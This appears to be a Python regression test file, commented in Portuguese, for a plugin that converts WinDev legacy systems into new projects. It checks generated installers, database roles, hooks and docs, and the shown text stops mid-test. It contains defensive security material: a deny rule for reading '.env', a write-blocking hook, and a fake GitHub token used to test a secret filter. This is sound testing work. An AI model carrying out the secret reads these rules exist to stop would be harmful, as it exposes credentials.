#!/usr/bin/env python3
"""Testes de regressao do plugin WX Claude Code. Rode: python3 tests/testes.py

Cada teste exercita um script de verdade num diretorio temporario e confere
a saida. Provas que antes eram manuais (questionario -> manifesto -> pre-flight,
roteador de modelos, PDCA, kanban, golden, hook do G0) viram regressao aqui.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[1]
SCRIPTS = RAIZ / "skills" / "conversao-wx" / "scripts"
EXEMPLO = RAIZ / "exemplos" / "estoque-wx"


def run(*args: str, entrada: str | None = None, cwd: Path | None = None) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, *map(str, args)], input=entrada, capture_output=True, text=True, cwd=cwd)


class Questionario(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copytree(EXEMPLO / "inputs", self.tmp / "inputs")
        (self.tmp / ".wx-migration").mkdir()
        shutil.copy(EXEMPLO / "questionario.json", self.tmp / ".wx-migration" / "questionario.json")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_aplica_e_nao_sobrescreve(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("modo=inventory", r.stdout)
        m = json.loads((self.tmp / ".wx-migration/wx-inputs.manifest.json").read_text())
        self.assertEqual(m["artifacts"]["sql_scripts"]["status"], "provided")
        self.assertEqual(m["evidence_root"], "../inputs")
        self.assertEqual(m["artifacts"]["sample_data_and_expected_results"]["status"], "provided")
        self.assertEqual(len(m["artifacts"]["sample_data_and_expected_results"]["items"]), 2)
        self.assertTrue((self.tmp / "DESIGN.md").exists())
        design = (self.tmp / "DESIGN.md").read_text()
        for secao in ("Grids (F3", "Formulários (F4", "Números, datas e moeda (F5", "Acessibilidade (F8"):
            self.assertIn(secao, design)
        self.assertIn("F2 novo", design); self.assertIn("Edição na célula: sim", design)
        self.assertIn("| selecionar | SELECIONAR REGISTRO | check | #1F5FBF |", design)
        self.assertIn("Barra da grade: acima da grade, alinhada à direita", design)
        self.assertIn("«Confirma a exclusão do registro?»", design)
        self.assertIn("Tipo: textura", design)
        self.assertIn("| WIN_Venda | principal | screenshots/win-venda-com-itens.png | provided |", design)
        self.assertIn("- totais no rodapé da grade", design)
        self.assertIn("Modo Impeccable: **Operate**", (self.tmp / "PRODUCT.md").read_text())
        self.assertIn("Estilo de resposta", (self.tmp / "CLAUDE.md").read_text())
        # bloco 0: empresa, governanca para o PMO e entrega sem senha
        empresa = (self.tmp / ".wx-migration/empresa.md").read_text()
        self.assertIn("Boller Sistemas Ltda", empresa); self.assertIn("Blumenau - SC", empresa)
        self.assertIn("marca/logotipo-estoque.svg (provided)", empresa); self.assertIn("| Maria Souza | Diretora comercial |", empresa)
        self.assertIn("**Prazo final de entrega: 2026-12-18**", (self.tmp / ".wx-migration/pmo/cronograma.md").read_text())
        self.assertIn("e1 --> e2", (self.tmp / ".wx-migration/pmo/fluxograma.md").read_text())
        self.assertIn("| RSK-002 |", (self.tmp / ".wx-migration/pmo/riscos.md").read_text())
        entrega = json.loads((self.tmp / ".wx-migration/entrega.json").read_text())
        self.assertEqual(entrega["credencial_ref"], "GITHUB_TOKEN"); self.assertEqual(entrega["github"]["usuario"], "adrianoboller")
        self.assertNotIn("abc", json.dumps(entrega))
        r2 = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        proc = (self.tmp / ".wx-migration/processo-de-conversao.md").read_text()
        self.assertIn("## Backend: Rust", proc); self.assertIn("**reescrita-guiada**", proc)
        self.assertIn("| Analise HFSQL | esquema PostgreSQL migrado por script; sqlx/diesel | G3 |", proc)
        self.assertIn("Ritmo: modulo a modulo", proc)
        # fluxo + esqueleto ERP (L6) + skills-recomendadas + a pasta de artefatos (M):
        # nada e regravado na segunda aplicacao
        self.assertEqual(r2.stdout.count("SKIPPED"), 101); self.assertEqual(r2.stdout.count("CREATED"), 0); self.assertIn("UPDATED", r2.stdout)
        resp = (self.tmp / ".wx-migration/respostas_questionario.md").read_text()
        self.assertIn("- Nome: **Adriano Boller**", resp); self.assertIn("## H · Backend de destino", resp)
        self.assertIn("0.15 github", resp); self.assertIn("credencial ref: GITHUB_TOKEN", resp)
        self.assertIn("respostas_questionario.md", (self.tmp / "CLAUDE.md").read_text())

    def test_tela_modelo_inexistente_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["F_estilo_impeccable"]["F0_tela_modelo"]["arquivos"][0]["arquivo"] = "screenshots/nao-existe.png"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("nao-existe.png", r.stderr)
        self.assertFalse((self.tmp / "DESIGN.md").exists())

    def test_estrategia_desconhecida_e_recusada(self):
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["H_backend"]["processo"]["estrategia"] = "big-bang"
        (self.tmp / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("big-bang", r.stderr)

    def test_ambiente_gera_instalador_papeis_e_env_sem_valores(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        amb = self.tmp / ".wx-migration/ambiente"
        sql = (amb / "papeis-postgresql.sql").read_text()
        self.assertIn("CREATE ROLE \"estoque_app\" LOGIN NOSUPERUSER PASSWORD '${ESTOQUE_APP_PASSWORD}';", sql)
        self.assertIn('GRANT SELECT ON ALL TABLES IN SCHEMA public TO "estoque_bi";', sql)
        env = (amb / ".env.exemplo").read_text()
        for l in env.splitlines():
            if l and not l.startswith("#"):
                self.assertTrue(l.endswith("="), l)
        sh = (amb / "instalar-ambiente.sh").read_text()
        self.assertIn("rustup update stable", sh); self.assertIn("${PGPASSWORD:?", sh); self.assertIn("git remote add origin https://github.com/adrianoboller/estoque-rs", sh)
        self.assertEqual(subprocess.run(["bash", "-n", str(amb / "instalar-ambiente.sh")]).returncode, 0)
        self.assertFalse((amb / "papeis-mysql.sql").exists())
        self.assertIn("| PostgreSQL | sim | 16 |", (self.tmp / ".wx-migration/ambiente.md").read_text())
        # papel sem senha_ref ou nivel desconhecido e recusado antes de gravar
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["K_ambiente"]["K2_postgresql"]["papeis"][0]["nivel"] = "admin"
        (self.tmp / ".wx-migration/q2.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q2.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("admin", r.stderr)

    def test_n8n_e_privilegios(self):
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        amb = self.tmp / ".wx-migration/ambiente"
        sh = (amb / "instalar-ambiente.sh").read_text()
        self.assertIn('if command -v sudo >/dev/null; then SUDO="sudo"', sh); self.assertIn("exec su root -c", sh)
        self.assertIn("priv apt-get install -y postgresql-16", sh); self.assertIn("docker compose up -d", sh)
        comp = (amb / "n8n/docker-compose.yml").read_text()
        self.assertIn("N8N_ENCRYPTION_KEY=${N8N_ENCRYPTION_KEY}", comp); self.assertIn("DB_POSTGRESDB_PASSWORD=${N8N_DB_PASSWORD}", comp)
        self.assertNotRegex(comp, r"PASSWORD=[^$\n]")
        itg = (amb / "n8n/integracao.md").read_text()
        self.assertIn("| estoque-baixo | POST | /webhook/estoque-baixo |", itg); self.assertIn("| Fechamento diário | cron 23:00 |", itg)
        self.assertIn("| n8n | sim | 1.100 (docker) |", (self.tmp / ".wx-migration/ambiente.md").read_text())
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["K_ambiente"]["K7_n8n"]["modo"] = "kubernetes"
        (self.tmp / ".wx-migration/q3.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q3.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("kubernetes", r.stderr)
        q["K_ambiente"]["K7_n8n"]["modo"] = "docker"; q["K_ambiente"]["K7_n8n"]["instalar"] = False
        t2 = Path(tempfile.mkdtemp()); shutil.copytree(EXEMPLO / "inputs", t2 / "inputs"); (t2 / ".wx-migration").mkdir()
        (t2 / ".wx-migration/questionario.json").write_text(json.dumps(q))
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", t2 / ".wx-migration/questionario.json", "--project-root", t2, "--plugin-root", RAIZ)
        self.assertFalse((t2 / ".wx-migration/ambiente/n8n").exists()); shutil.rmtree(t2, ignore_errors=True)

    def test_contexto_do_claude_code_kickoff_index_hooks_mcp_docker(self):
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        kick = (self.tmp / ".wx-migration/prompts/kickoff.md").read_text()
        self.assertIn("**Isto não é vibe coding**", kick); self.assertIn("aprovador: **Adriano Boller**", kick)
        self.assertIn("3. O sistema deve registrar entrada e saída", kick); self.assertIn("Fora da v1: Etiquetas térmicas", kick)
        self.assertIn("Tela modelo (referência visual): WIN_Venda (principal", (self.tmp / ".wx-migration/prompts/prototipacao.md").read_text())
        idx = (self.tmp / "INDEX_FILES.md").read_text()
        self.assertIn("| `INDEX_FILES.md` | este mapa; regravado a cada aplicação do questionário | existe |", idx)
        self.assertIn("| `.wx-migration/respostas_questionario.md` |", idx); self.assertIn("| existe |", idx.split("respostas_questionario.md")[1].split("\n")[0])
        self.assertIn("| `./inputs/banco.sql` | script SQL |", idx)
        st = json.loads((self.tmp / ".claude/settings.json").read_text())
        self.assertEqual(st["hooks"]["Stop"][0]["hooks"][0]["command"], "bash .claude/hooks/testar.sh"); self.assertIn("Read(./.env)", st["permissions"]["deny"])
        self.assertIn("cargo test --workspace", (self.tmp / ".claude/hooks/testar.sh").read_text())
        self.assertTrue((self.tmp / ".claude/skills/regras-do-legado/SKILL.md").read_text().startswith("---\nname: regras-do-legado"))
        mcp = json.loads((self.tmp / ".mcp.json").read_text())
        self.assertEqual(set(mcp["mcpServers"]), {"postgresql", "github"}); self.assertIn("${GITHUB_TOKEN}", json.dumps(mcp))
        self.assertIn("COPY --from=build /app/target/release/estoque", (self.tmp / "Dockerfile").read_text())
        comp = (self.tmp / "docker-compose.yml").read_text(); self.assertIn("POSTGRES_PASSWORD=${PGPASSWORD}", comp); self.assertIn("- ESTOQUE_API_KEY=${ESTOQUE_API_KEY}", comp)
        self.assertIn("INDEX_FILES.md", (self.tmp / "CLAUDE.md").read_text())
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["L_contexto_e_implantacao"]["L5_mcp_e_skills"]["mcps"] = ["slack"]
        (self.tmp / ".wx-migration/q4.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q4.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertIn("slack", r.stderr)

    def test_esqueleto_erp_l6_gera_arvore_liga_skills_e_nao_sobrescreve(self):
        """L6.gerar cria a arvore do pacote ERP; cada modulo do 0.8 aponta para uma skill erp-*; reaplicar nao sobrescreve."""
        (self.tmp / "AGENTS.md").write_text("meu\n")
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual((self.tmp / "AGENTS.md").read_text(), "meu\n")
        for rel in ("CONTEXT.md", "CONTEXT-MAP.md", "UBIQUITOUS_LANGUAGE.md", "ARCHITECTURE.md", "SECURITY.md", ".editorconfig",
                    "docs/adr/0001-monolito-modular.md", "docs/adr/0004-fiscal-brasil.md", "docs/domain/cadastros.md", "docs/domain/financeiro.md",
                    "database/migrations/0001_base.sql", "database/rollback/0001_base.sql", "src/movimentacao/README.md",
                    "tests/security/.gitkeep", "scripts/verification/README.md", ".github/workflows/security.yml"):
            self.assertTrue((self.tmp / rel).exists(), rel)
        self.assertIn("erp-inventory", (self.tmp / "docs/domain/movimentacao.md").read_text())
        self.assertIn("erp-accounting", (self.tmp / "docs/domain/financeiro.md").read_text())
        self.assertIn("nenhuma alíquota fica em código", (self.tmp / "docs/adr/0004-fiscal-brasil.md").read_text())
        self.assertIn("Não há multiempresa", (self.tmp / "docs/adr/0002-multiempresa.md").read_text())
        cl = (self.tmp / "CLAUDE.md").read_text()
        self.assertIn("## Skills de ERP", cl); self.assertIn("| movimentacao | `src/movimentacao/` | `erp-inventory` |", cl)
        self.assertIn("| `docs/domain/financeiro.md` |", (self.tmp / "INDEX_FILES.md").read_text())
        self.assertIn("cargo test --workspace", (self.tmp / ".github/workflows/tests.yml").read_text())
        # 3.18.0: STRIDE, contratos, dicionario, runbooks e as regras absorvidas
        for rel in ("docs/security/threat-model.md", "docs/security/requisitos.md", "docs/api/openapi.yaml", "docs/api/events.asyncapi.yaml",
                    "docs/data/erd.md", "docs/data/data-dictionary.md", "docs/domain/invariants.md", "docs/domain/workflows.md",
                    "docs/runbooks/incident-response.md", "docs/runbooks/backup-restore.md", "docs/skills-recomendadas.md"):
            self.assertTrue((self.tmp / rel).exists(), rel)
        self.assertIn("NUMERIC(19,4)", (self.tmp / "docs/data/modelo-de-dados.md").read_text())
        self.assertIn("Negar por padrão", (self.tmp / "SECURITY.md").read_text())
        self.assertIn("openapi: 3.1.0", (self.tmp / "docs/api/openapi.yaml").read_text())
        rec = (self.tmp / "docs/skills-recomendadas.md").read_text()
        # Rust + PostgreSQL + React web: entram; Supabase nao instalado e multiempresa=false: ficam fora
        for s_ in ("rust-async-patterns", "postgresql-table-design", "vercel-react-best-practices", "webapp-testing"):
            self.assertIn(f"`npx skills add {s_}`", rec, s_)
        for s_ in ("supabase-postgres-best-practices", "access-control-patterns"):
            self.assertNotIn(f"`npx skills add {s_}`", rec, s_)
        self.assertIn("O plugin não as instala", rec)
        # sem L6.gerar nada disso aparece
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["L_contexto_e_implantacao"]["L6_esqueleto_erp"]["gerar"] = False
        outro = self.tmp / "sem-erp"; (outro / ".wx-migration").mkdir(parents=True); shutil.copytree(EXEMPLO / "inputs", outro / "inputs")
        (outro / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", outro / ".wx-migration/questionario.json", "--project-root", outro, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertFalse((outro / "CONTEXT.md").exists()); self.assertNotIn("## Skills de ERP", (outro / "CLAUDE.md").read_text())

    def test_artefatos_bloco_m_arquiva_confere_segredo_e_cataloga(self):
        """Bloco M: a pasta e o LEIA-ME saem do questionario; o script arquiva com hash,
        recusa segredo, recusa sem onde_usar e recusa sobrescrever com outro conteudo."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        art = self.tmp / "artefatos"
        self.assertTrue((art / "LEIA-ME.md").exists()); self.assertTrue((art / "query-sql").is_dir())
        self.assertIn("## Artefatos submetidos", (self.tmp / "CLAUDE.md").read_text())
        self.assertIn("| `artefatos/CATALOGO.md` |", (self.tmp / "INDEX_FILES.md").read_text())
        arq = SCRIPTS / "arquivar_artefato.py"
        bom = self.tmp / "notas.txt"; bom.write_text("Venda com saldo zero bloqueia.\n")
        r = run(arq, "--project-root", self.tmp, "--arquivo", bom, "--tipo", "anotacao",
                "--onde-usar", "G1: regras ditadas pelo cliente", "--questionario", self.tmp / ".wx-migration/questionario.json")
        self.assertEqual(r.returncode, 0, r.stderr); self.assertIn("ARQUIVADO", r.stdout)
        self.assertTrue((art / "anotacao" / "notas.txt").exists())
        cat = (art / "CATALOGO.md").read_text()
        self.assertIn("1 artefato em", cat); self.assertIn("G1: regras ditadas pelo cliente", cat)
        reg = json.loads((art / "registro.json").read_text())
        self.assertEqual(len(reg["itens"][0]["sha256"]), 64)
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        self.assertTrue(any(i["arquivo"] == "notas.txt" for i in q["M_artefatos"]["itens"]))
        self.assertNotIn("sha256", json.dumps(q["M_artefatos"]))  # hash mora no registro, nao no questionario
        # reenvio identico nao duplica
        r = run(arq, "--project-root", self.tmp, "--arquivo", bom, "--tipo", "anotacao", "--onde-usar", "G1")
        self.assertEqual(r.returncode, 0); self.assertIn("JA ARQUIVADO", r.stdout)
        # segredo, onde_usar vazio e mesmo nome com outro conteudo sao recusados
        seg = self.tmp / "com-token.txt"; seg.write_text("ghp_" + "a" * 36 + "\n")
        r = run(arq, "--project-root", self.tmp, "--arquivo", seg, "--tipo", "anotacao", "--onde-usar", "G1")
        self.assertEqual(r.returncode, 2); self.assertIn("token", r.stderr)
        self.assertFalse((art / "anotacao" / "com-token.txt").exists())
        r = run(arq, "--project-root", self.tmp, "--arquivo", bom, "--tipo", "anotacao", "--onde-usar", "  ")
        self.assertEqual(r.returncode, 2); self.assertIn("onde-usar", r.stderr)
        bom.write_text("outro conteudo\n")
        r = run(arq, "--project-root", self.tmp, "--arquivo", bom, "--tipo", "anotacao", "--onde-usar", "G1")
        self.assertEqual(r.returncode, 2); self.assertIn("nao se sobrescreve", r.stderr)
        self.assertEqual((art / "anotacao" / "notas.txt").read_text(), "Venda com saldo zero bloqueia.\n")

    def test_hook_recusa_escrita_em_artefatos(self):
        """A pasta de artefatos e somente leitura como os anexos: so o script arquiva."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        hook = RAIZ / "hooks" / "guarda_anexos_e_segredos.py"
        pedido = {"tool_name": "Write", "cwd": str(self.tmp), "tool_input": {"file_path": str(self.tmp / "artefatos" / "CATALOGO.md"), "content": "editado a mao"}}
        p = subprocess.run([sys.executable, str(hook)], input=json.dumps(pedido), capture_output=True, text=True)
        self.assertEqual(json.loads(p.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertIn("arquivar_artefato.py", p.stdout)
        # fora da pasta, segue liberado
        pedido["tool_input"]["file_path"] = str(self.tmp / "docs" / "PRD.md")
        p = subprocess.run([sys.executable, str(hook)], input=json.dumps(pedido), capture_output=True, text=True)
        self.assertEqual(p.stdout.strip(), "")

    def test_perfil_php_gera_dockerfile_e_processo(self):
        """PHP como destino: perfil php no processo de conversao e no Dockerfile."""
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["H_backend"]["perfil"] = "php"; q["H_backend"]["linguagem"] = "PHP"; q["H_backend"]["framework"] = "Laravel 11"
        outro = self.tmp / "php"; (outro / ".wx-migration").mkdir(parents=True)
        shutil.copytree(EXEMPLO / "inputs", outro / "inputs")
        (outro / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", outro / ".wx-migration/questionario.json", "--project-root", outro, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("## Backend: PHP 8.3", (outro / ".wx-migration/processo-de-conversao.md").read_text())
        self.assertIn("FROM php:8.3-fpm-alpine", (outro / "Dockerfile").read_text())

    def test_legado_e_ou_e_destino_em_qualquer_linguagem(self):
        """Legado e E/OU (um ou mais produtos) e o destino nao esta preso a lista;
        mas o validador continua recusando produto desconhecido e 'outra' sem linguagem."""
        base = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())

        def aplica(q, pasta):
            d = self.tmp / pasta; (d / ".wx-migration").mkdir(parents=True)
            shutil.copytree(EXEMPLO / "inputs", d / "inputs")
            (d / ".wx-migration/questionario.json").write_text(json.dumps(q))
            return d, run(SCRIPTS / "aplicar_questionario.py", "--questionario", d / ".wx-migration/questionario.json",
                          "--project-root", d, "--plugin-root", RAIZ)

        # so PHP, sem nenhum produto WX: o plugin aceita
        q = json.loads(json.dumps(base))
        q["projeto"]["produtos"] = ["php"]; q["projeto"]["principal"] = "php"
        q["projeto"]["legado_php"] = {"tem": True, "raiz": "./inputs", "versao": "7.4", "framework": "nenhum", "estilo": "procedural"}
        d, r = aplica(q, "so-php")
        self.assertEqual(r.returncode, 0, r.stderr)

        # WX + PHP + outra, com destino fora da lista de perfis
        q = json.loads(json.dumps(base))
        q["projeto"]["produtos"] = ["windev", "php", "outra"]; q["projeto"]["principal"] = "windev"
        q["projeto"]["legado_outra"] = {"linguagem": "Delphi 7", "versao": "7", "framework": "VCL", "observacao": ""}
        q["H_backend"]["perfil"] = "outra"; q["H_backend"]["linguagem"] = "Elixir"; q["H_backend"]["framework"] = "Phoenix"
        d, r = aplica(q, "misto")
        self.assertEqual(r.returncode, 0, r.stderr)
        proc = (d / ".wx-migration/processo-de-conversao.md").read_text()
        self.assertIn("## Backend: Elixir", proc)
        self.assertIn("funcoes ou metodos por dominio em Elixir", proc)

        # recusas: produto desconhecido, principal fora da lista, 'outra' sem linguagem
        for muda, esperado in (
            (lambda x: x["projeto"].__setitem__("produtos", ["cobol"]), "desconhecido"),
            (lambda x: (x["projeto"].__setitem__("produtos", ["windev"]), x["projeto"].__setitem__("principal", "php")), "nao esta em produtos"),
            (lambda x: (x["projeto"].__setitem__("produtos", ["outra"]), x["projeto"].__setitem__("principal", "outra"),
                        x["projeto"].__setitem__("legado_outra", {"linguagem": ""})), "legado_outra.linguagem"),
        ):
            q = json.loads(json.dumps(base)); muda(q)
            f = self.tmp / "ruim.json"; f.write_text(json.dumps(q))
            alvo = self.tmp / "x"; alvo.mkdir(exist_ok=True)
            r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", f, "--project-root", alvo, "--plugin-root", RAIZ)
            self.assertEqual(r.returncode, 2, r.stdout); self.assertIn(esperado, r.stderr)

    def test_lista_de_perguntas_cobre_o_modelo_e_todo_recurso_tem_comando(self):
        """A lista de ids sai do modelo (nada escrito a mao) e todo bloco aparece nela;
        e cada recurso do plugin tem um comando que o invoca."""
        r = run(SCRIPTS / "listar_perguntas.py", "--json")
        self.assertEqual(r.returncode, 0, r.stderr)
        itens = json.loads(r.stdout)
        ids = {i["id"] for i in itens}
        for esperado in ("0", "0.16", "A", "F", "F0", "F9", "H", "I", "K", "K7", "L", "L6", "M", "PROJ"):
            self.assertIn(esperado, ids, esperado)
        modelo = json.loads((RAIZ / "skills/conversao-wx/templates/questionario.json").read_text())
        blocos = {k for k in modelo if k not in {"schema_version", "respondido_em"}}
        self.assertEqual({i["bloco"] for i in itens if i["nivel"] == 1}, blocos)
        r = run(SCRIPTS / "listar_perguntas.py", "--id", "nao-existe")
        self.assertEqual(r.returncode, 2)
        cmds = {p.stem for p in (RAIZ / "commands").glob("*.md")}
        for c in ("questionario", "pergunta", "comandos", "converter", "preflight", "artefato", "estilo-telas",
                  "golden", "pmo", "equipe", "ambiente", "help-wl", "rag", "exportar", "zelador", "licenca",
                  "laudo-tokens", "pdf", "log"):
            self.assertIn(c, cmds, c)
        indice = (RAIZ / "commands" / "comandos.md").read_text()
        for c in cmds:
            self.assertIn(f"/wx-claude-code:{c}", indice, f"{c} fora do índice")
        for p in (RAIZ / "commands").glob("*.md"):
            desc = re.search(r'^description: "?(.+?)"?$', p.read_text(), re.M).group(1)
            self.assertLessEqual(len(desc), 300, f"{p.name}: {len(desc)} caracteres")

    def test_k8_backup_e_replicacao_gera_plano_e_recusa_incoerencia(self):
        """K8: o plano sai das respostas, senha so por nome de variavel, e o validador
        recusa RPO que o tipo de backup nao sustenta, failover automatico sem ferramenta
        e cifrado sem chave_ref."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        plano = (self.tmp / ".wx-migration/ambiente/backup-e-replicacao.md").read_text()
        self.assertIn("**RPO 15 min**", plano); self.assertIn("**RTO 120 min**", plano)
        self.assertIn("pgbackrest", plano); self.assertIn("estoque-replica-1", plano)
        self.assertIn("BACKUP_ENCRYPTION_KEY", plano)
        self.assertIn("Replica assincrona nao e backup", plano)
        self.assertIn("ultima restauracao testada | 2026-08-30", plano)
        self.assertNotIn("senha", plano.lower().replace("senha e chave aparecem aqui", ""))
        self.assertIn("| `.wx-migration/ambiente/backup-e-replicacao.md` |", (self.tmp / "INDEX_FILES.md").read_text())
        base = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())

        def recusa(muda, esperado):
            q = json.loads(json.dumps(base)); muda(q["K_ambiente"]["K8_backup_e_replicacao"])
            f = self.tmp / "k8.json"; f.write_text(json.dumps(q))
            alvo = self.tmp / "k8out"; alvo.mkdir(exist_ok=True)
            r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", f, "--project-root", alvo, "--plugin-root", RAIZ)
            self.assertEqual(r.returncode, 2, r.stdout); self.assertIn(esperado, r.stderr)

        recusa(lambda k8: k8["backup"].__setitem__("tipo", "completo"), "nao cabe em backup diario")
        recusa(lambda k8: k8["backup"].__setitem__("ferramenta", "rsync-do-primo"), "backup.ferramenta")
        recusa(lambda k8: k8["backup"].__setitem__("chave_ref", ""), "chave_ref")
        recusa(lambda k8: k8["replicacao"].__setitem__("ferramenta_de_failover", "nenhum") or k8["replicacao"].__setitem__("failover", "automatico"), "failover automatico")
        recusa(lambda k8: k8["replicacao"]["replicas"][0].__setitem__("papel", "chefe"), "papel primaria | leitura | espera")
        recusa(lambda k8: k8["backup"].__setitem__("retencao_dias", 0), "retencao_dias")
        # senha em texto puro no K8 e recusada pelo filtro de segredos
        q = json.loads(json.dumps(base)); q["K_ambiente"]["K8_backup_e_replicacao"]["backup"]["senha"] = "SenhaDoBackup123"
        f = self.tmp / "k8s.json"; f.write_text(json.dumps(q))
        alvo = self.tmp / "k8s"; alvo.mkdir(exist_ok=True)
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", f, "--project-root", alvo, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 2); self.assertNotIn("SenhaDoBackup123", r.stderr + r.stdout)

    def test_respostas_md_tem_indice_por_id_para_os_agentes(self):
        """As 60 respostas em md, com indice por id e o estado de cada uma: e o que
        impede um agente de perguntar de novo o que ja foi respondido."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        md = (self.tmp / ".wx-migration/respostas_questionario.md").read_text()
        self.assertIn("**Para os agentes:**", md)
        self.assertIn("## Índice por id", md)
        ids = set(re.findall(r"^\| `([^`]+)` \|", md, re.M))
        itens = json.loads(run(SCRIPTS / "listar_perguntas.py", "--json").stdout)
        self.assertEqual(len(itens), 60)
        for i in itens:
            self.assertIn(i["id"], ids, i["id"])
        self.assertIn("60 perguntas.", md)
        self.assertIn("**K8 backup e replicacao**", md)
        self.assertIn("`artefatos/CATALOGO.md`", md)
        self.assertIn("M · Artefatos e anotações submetidos", md)
        self.assertNotIn("PGPASSWORD=", md)  # so o NOME da variavel, nunca o valor
        # item esvaziado aparece como nao respondido: e isso que autoriza perguntar de novo
        q = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
        q["L_contexto_e_implantacao"]["L2_prototipacao"] = {"ferramenta": "", "telas_prioritarias": [], "observacao": ""}
        vazio = self.tmp / "vazio"; (vazio / ".wx-migration").mkdir(parents=True)
        shutil.copytree(EXEMPLO / "inputs", vazio / "inputs")
        (vazio / ".wx-migration/questionario.json").write_text(json.dumps(q))
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", vazio / ".wx-migration/questionario.json", "--project-root", vazio, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        md2 = (vazio / ".wx-migration/respostas_questionario.md").read_text()
        self.assertIn("| `L2` | Prototipacao | não |", md2)

    def test_registro_grava_toda_operacao_sem_vazar_segredo(self):
        """Toda operacao do plugin deixa linha em .wx-migration/logs; sem projeto por
        perto nao grava nada; e argumento com nome de segredo vira <omitido>."""
        r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        self.assertEqual(r.returncode, 0, r.stderr)
        run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "espaco")
        logs = sorted((self.tmp / ".wx-migration/logs").glob("plugin-*.jsonl"))
        self.assertTrue(logs, "nenhum log gravado")
        linhas = [json.loads(l) for l in logs[0].read_text().splitlines()]
        ops = {i["operacao"] for i in linhas}
        self.assertIn("aplicar_questionario", ops); self.assertIn("zelador", ops)
        for i in linhas:
